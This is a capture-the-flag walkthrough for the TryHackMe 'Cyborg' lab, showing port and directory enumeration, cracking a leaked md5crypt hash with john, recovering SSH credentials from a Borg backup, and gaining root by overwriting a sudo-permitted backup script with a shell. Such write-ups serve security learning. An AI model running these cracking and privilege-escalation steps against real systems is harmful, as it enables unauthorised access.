<p align="center">
  THM : Cyborg<br>
  Difficulty : Easy<br>
  <img src="https://i.imgur.com/cSF3hOM.jpg">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Website enumeration](#website-enumeration)
- [Extracting the archive](#extracting-the-archive)
- [Hash cracking](#hash-cracking)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan

Let's use [nmap](https://nmap.org/) to start an agressive scan against the target :  
```
attacker@AttackBox:~/Cyborg$ nmap 10.10.45.29 -A -p- -oN nmapResults.txt
Starting Nmap 7.80 ( https://nmap.org ) at 2023-01-18 02:35 CET
Nmap scan report for 10.10.45.29
Host is up (0.072s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.43 seconds
```

The only service we can enumerate is the webserver on port 80.

**Question : Scan the machine, how many ports are open ?**  
**Answer : 2**  

**Question : What service is running on port 22 ?**  
**Answer: SSH**  

**Question : What service is running on port 80 ?**  
**Answer : HTTP**  

## Website enumeration

Let's use [gobuster](https://github.com/OJ/gobuster) to find files and directories on the webserver :  
```
attacker@AttackBox:~/Cyborg$ gobuster dir -u http://10.10.45.29/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobusterResults.txt
===============================================================
Gobuster v3.2.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.45.29/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.1
[+] Timeout:                 10s
===============================================================
2023/01/18 02:42:42 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 310] [--> http://10.10.45.29/admin/]
/etc                  (Status: 301) [Size: 308] [--> http://10.10.45.29/etc/]
/server-status        (Status: 403) [Size: 276]
Progress: 220546 / 220561 (99.99%)
===============================================================
2023/01/18 02:55:48 Finished
===============================================================
```

So we found two directories, `/admin/` and `/etc/`. Let's see what's inside the first one :  
![](https://i.imgur.com/1GsaN0S.jpg)  

There is an `Admins` tab at the top of this page. Let's take a look at it :  
![](https://i.imgur.com/HyNNh8I.jpg)  

There is a dialog between Josh, Adam and Alex. There is one useful information here : the name of the backup `music_archive`.  

There is another interesting tab at the top of the page : `Archive`. If we click on it, we can download the archive Alex was talking about in the dialog we found :  
![](https://i.imgur.com/JwnOWwz.jpg)  

So I downloaded the archive. Before we try to do something with it, let's finish the enumeration on the webserver. Let's take a look at `/etc/` :  
![](https://i.imgur.com/rZwkaHd.jpg)  

There is a `squid` directory, let's see what's inside :  
![](https://i.imgur.com/n7fuy6Z.jpg)  

There is a file named `passwd`, we can find something that looks like a username (same as the archive name Alex was talking about), and a hash :  
![](https://i.imgur.com/sHZByrF.jpg)  

## Extracting the archive

Now, let's try to extract the archive we downloaded from the webserver :  
```
attacker@AttackBox:~/Cyborg$ ls
archive.tar  gobusterResults.txt  nmapResults.txt
attacker@AttackBox:~/Cyborg$ tar -xvf archive.tar 
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1
attacker@AttackBox:~/Cyborg$
```

Let's see what was extracted. There is a `README` file in `home/field/dev/final_archive`. Let's see if we can find any useful informations in it :  
```
attacker@AttackBox:~/Cyborg/home/field/dev/final_archive$ ls
config  data  hints.5  index.5  integrity.5  nonce  README
attacker@AttackBox:~/Cyborg/home/field/dev/final_archive$ cat README 
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

So this is a Borg Backup. Let's take a look at the given URL :  
![](https://i.imgur.com/MDMjetq.jpg)  

It's a documentation for Borg Backups. First, let's install Borg Backup using `sudo apt install borgbackup`. There is a section for borg backup extraction :  
![](https://i.imgur.com/ir5deMn.jpg)  

We can extract the borg backup by using `borg extract /path/to/repo::archive_name`. So we need to use `borg extract final_archive::music_archive` :  
```
attacker@AttackBox:~/Cyborg/home/field/dev$ borg extract final_archive::music_archive
Enter passphrase for key /home/attacker/Cyborg/home/field/dev/final_archive:
```

We need the passphrase. Remember, we found a hash on the webserver in `/etc/squid/passwd`

## Hash cracking

Let's try to crack the hash we found earlier. First, we copy the hash in a file. Then, we can use [john](https://www.openwall.com/john/doc/) with the 
wordlist `rockyou.txt` :  
```
attacker@AttackBox:~/Cyborg/home/field/dev$ echo '$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.' > hash.txt
attacker@AttackBox:~/Cyborg/home/field/dev$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
Use the "--format=md5crypt-long" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 SSE4.1 4x3])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
squidward        (?)     
1g 0:00:00:00 DONE (2023-01-18 03:14) 1.449g/s 56486p/s 56486c/s 56486C/s willies..salsabila
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We successfully cracked the hash ! Now, let's extract the archive :  
```
attacker@AttackBox:~/Cyborg/home/field/dev$ borg extract final_archive::music_archive
Enter passphrase for key /home/attacker/Cyborg/home/field/dev/final_archive: 
attacker@AttackBox:~/Cyborg/home/field/dev$ ls
final_archive  hash.txt  home
```

Now, there is a new directory named `home`, let's see what's inside :  
```
attacker@AttackBox:~/Cyborg/home/field/dev$ cd home
attacker@AttackBox:~/Cyborg/home/field/dev/home$ ls
alex
attacker@AttackBox:~/Cyborg/home/field/dev/home$ cd alex
attacker@AttackBox:~/Cyborg/home/field/dev/home/alex$ ls -la
total 64
drwxr-xr-x 12 attacker attacker 4096 29 déc.   2020 .
drwx------  3 attacker attacker 4096 18 janv. 03:14 ..
-rw-------  1 attacker attacker  439 28 déc.   2020 .bash_history
-rw-r--r--  1 attacker attacker  220 28 déc.   2020 .bash_logout
-rw-r--r--  1 attacker attacker 3637 28 déc.   2020 .bashrc
drwx------  4 attacker attacker 4096 28 déc.   2020 .config
drwx------  3 attacker attacker 4096 28 déc.   2020 .dbus
drwxrwxr-x  2 attacker attacker 4096 29 déc.   2020 Desktop
drwxrwxr-x  2 attacker attacker 4096 29 déc.   2020 Documents
drwxrwxr-x  2 attacker attacker 4096 28 déc.   2020 Downloads
drwxrwxr-x  2 attacker attacker 4096 28 déc.   2020 Music
drwxrwxr-x  2 attacker attacker 4096 28 déc.   2020 Pictures
-rw-r--r--  1 attacker attacker  675 28 déc.   2020 .profile
drwxrwxr-x  2 attacker attacker 4096 28 déc.   2020 Public
drwxrwxr-x  2 attacker attacker 4096 28 déc.   2020 Templates
drwxrwxr-x  2 attacker attacker 4096 28 déc.   2020 Videos
```

So we have a username `alex`. We also have his home directory. Let's see what's inside his `Documents` :  
```
attacker@AttackBox:~/Cyborg/home/field/dev/home/alex$ cd Documents/
attacker@AttackBox:~/Cyborg/home/field/dev/home/alex/Documents$ ls
note.txt
attacker@AttackBox:~/Cyborg/home/field/dev/home/alex/Documents$ cat note.txt 
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

We have the password for user `alex` ! Let's use those credentials to login on SSH :  
```
attacker@AttackBox:~/Cyborg/home/field/dev/home/alex/Documents$ ssh alex@10.10.45.29
The authenticity of host '10.10.45.29 (10.10.45.29)' can't be established.
ECDSA key fingerprint is SHA256:uB5ulnLcQitH1NC30YfXJUbdLjQLRvGhDRUgCSAD7F8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.45.29' (ECDSA) to the list of known hosts.
alex@10.10.45.29's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


27 packages can be updated.
0 updates are security updates.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

alex@ubuntu:~$
```

Let's get the `user.txt` flag :  
```
alex@ubuntu:~$ ls 
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
alex@ubuntu:~$ cat user.txt 
flag{*********************************}
```

Now, it's time for privilege escalation !

## Privilege escalation

Let's see if we are part of some groups :  
```
alex@ubuntu:~$ id
uid=1000(alex) gid=1000(alex) groups=1000(alex),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

We are part of `sudo` group. Let's see what we can run using `sudo` :  
```
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

We can run `/etc/mp3backups/backup.sh` as root without password ! Let's take closer look at this bash script :  
```
alex@ubuntu:/etc/mp3backups$ ls -la
total 28
drwxr-xr-x   2 root root  4096 Dec 30  2020 .
drwxr-xr-x 133 root root 12288 Dec 31  2020 ..
-rw-r--r--   1 root root   339 Jan 17 18:24 backed_up_files.txt
-r-xr-xr--   1 alex alex  1083 Dec 30  2020 backup.sh
-rw-r--r--   1 root root    45 Jan 17 18:24 ubuntu-scheduled.tgz
```

We are owner of `backup.sh`... We just need to make it writable by using `chmod +w backup.sh`. After that, we can put a simple command to open a shell on it :  
```
alex@ubuntu:/etc/mp3backups$ chmod +w backup.sh 
alex@ubuntu:/etc/mp3backups$ echo '#!/bin/bash' > backup.sh
alex@ubuntu:/etc/mp3backups$ echo '/bin/bash' >> backup.sh
alex@ubuntu:/etc/mp3backups$ cat backup.sh 
#!/bin/bash
/bin/bash
```

Now, we can use `sudo ./backup.sh` to get a root shell :  
```
alex@ubuntu:/etc/mp3backups$ sudo ./backup.sh 
root@ubuntu:/etc/mp3backups#
```

We are root ! Let's get the root flag :  
```
root@ubuntu:/etc/mp3backups# cd /root
root@ubuntu:/root# ls
root.txt
root@ubuntu:/root# cat root.txt 
flag{******************************}
```

## Conclusion

In this room, we have practiced : 
- Ports/Services enumeration using [nmap](https://nmap.org/)
- Website enumeration using [gobuster](https://github.com/OJ/gobuster)
- Hash cracking using [john](https://www.openwall.com/john/doc/)
- Basic linux enumeration
- Basic privilege escalation

And we also learned to use Borg Backup. Thanks for this room ! And thanks for reading my write ups !

